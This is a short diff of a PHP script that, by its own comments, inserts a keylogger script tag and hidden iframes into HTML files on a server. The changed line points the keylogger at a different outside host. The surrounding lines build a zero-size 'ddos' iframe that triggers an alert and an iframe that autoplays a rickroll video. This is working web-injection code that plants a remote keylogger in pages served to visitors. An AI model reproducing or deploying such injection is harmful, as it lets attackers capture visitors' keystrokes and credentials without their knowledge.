@@ -35,7 +35,7 @@ foreach($html->find('img') as $element){
 
 //ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
 //ADDING RICKROLL ATTACK TEST
-$keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
+$keyloggerscript = "http://stme.esy.es/js/keylogger.js";
 $ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
 $textToInsert="script src='$keyloggerscript'></script>"."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
 $contents = file_get_contents("$htmlFileName");
